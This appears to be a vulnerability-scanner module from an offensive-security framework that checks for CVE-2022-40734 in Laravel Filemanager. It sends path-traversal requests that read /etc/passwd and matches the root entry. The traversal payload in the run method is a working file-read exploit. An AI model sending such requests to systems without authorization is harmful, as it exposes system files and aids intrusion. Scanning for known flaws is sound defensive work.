#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Laravel Filemanager (aka UniSharp) through version 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Laravel Filemanager v2.5.1 - Local File Inclusion Detection',
        'description': 'Laravel Filemanager (aka UniSharp) through version 2.5.1 is vulnerable to local file inclusion via download?working_dir=%2F.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'laravel', 'unisharp', 'lfi', 'traversal', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/UniSharp/laravel-filemanager/issues/1150',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-40734',
            'https://github.com/UniSharp/laravel-filemanager/issues/1150#issuecomment-1320186966',
            'https://github.com/UniSharp/laravel-filemanager/issues/1150#issuecomment-1825310417',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2022-40734',
    }

    def run(self):
        for path in ('/download?working_dir=%2F../../../../../../../../../../../../../../../../../../../etc&type=Files&file=passwd', '/laravel-filemanager/download?working_dir=%2F../../../../../../../../../../../../../../../../../../../etc&type=Files&file=passwd'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_regexes = ('root:[x*]:0:0',)
            if (any(re.search(rx, body, 0) for rx in body_regexes)):
                self.set_info(
                    severity='medium',
                    reason="Laravel Filemanager v2.5.1 - Local File Inclusion detected",
                    path=path,
                )
                return True
        return False

